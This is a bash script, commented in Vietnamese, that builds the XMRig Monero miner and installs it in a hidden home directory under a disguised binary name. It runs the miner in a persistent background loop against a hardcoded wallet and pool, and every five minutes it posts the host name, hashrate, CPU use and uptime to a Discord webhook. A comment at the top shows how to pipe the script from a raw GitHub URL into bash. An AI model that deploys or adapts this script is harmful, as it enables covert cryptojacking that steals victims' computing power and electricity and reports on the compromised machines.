# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/worker/setup.sh)

#!/bin/bash
# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3_local.sh)

# ==== CONFIG ====
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
POOL="pool.hashvault.pro:443"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/xxxxx/xxxxxxxxxxxx"
WORKER="test_$(hostname)"

INSTALL_DIR="$HOME/.miner_hidden"
CUSTOM_NAME="xmrig_hidden"
LOG_FILE="$INSTALL_DIR/xmrig.log"
# =================

echo "[*] Cài thư viện cần thiết..."
command -v cmake >/dev/null 2>&1 || echo "❌ Thiếu cmake, vui lòng cài thủ công!"
command -v make >/dev/null 2>&1 || echo "❌ Thiếu make, vui lòng cài thủ công!"
command -v git >/dev/null 2>&1 || echo "❌ Thiếu git, vui lòng cài thủ công!"

mkdir -p "$INSTALL_DIR"
cd "$HOME"
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)
cp xmrig "$INSTALL_DIR/$CUSTOM_NAME"
chmod +x "$INSTALL_DIR/$CUSTOM_NAME"

# Gửi log về Discord
cat > "$INSTALL_DIR/send_log.sh" << EOF
#!/bin/bash
HASHRATE=\$(grep -i "speed" "$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)
HOST=\$(hostname)

curl -s -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"XMRig\\",
  \\"content\\": \\"🔧 \\\`\$HOST\\\`: \$HASHRATE | CPU: \$CPU_USAGE% | Uptime: \$UPTIME\\nLog: \\\`$CUSTOM_NAME\\\`\\" 
}" "$DISCORD_WEBHOOK" >/dev/null
EOF

chmod +x "$INSTALL_DIR/send_log.sh"

# Chạy đào ngầm và gửi log mỗi 5 phút
nohup bash -c '
  while true; do
    "$INSTALL_DIR/$CUSTOM_NAME" -o '"$POOL"' -u '"$WALLET.$WORKER"' -k --coin monero --tls \
      --cpu-priority=3 --threads=$(nproc) --donate-level=0 \
      --max-cpu-usage=65 --log-file="'"$LOG_FILE"'"
    sleep 5
  done
' > /dev/null 2>&1 &

# Gửi log mỗi 5 phút
nohup bash -c '
  while true; do
    "$INSTALL_DIR/send_log.sh"
    sleep 300
  done
' > /dev/null 2>&1 &

echo "✅ Đã chạy XMRig trong nền. Gửi log về Discord mỗi 5 phút."
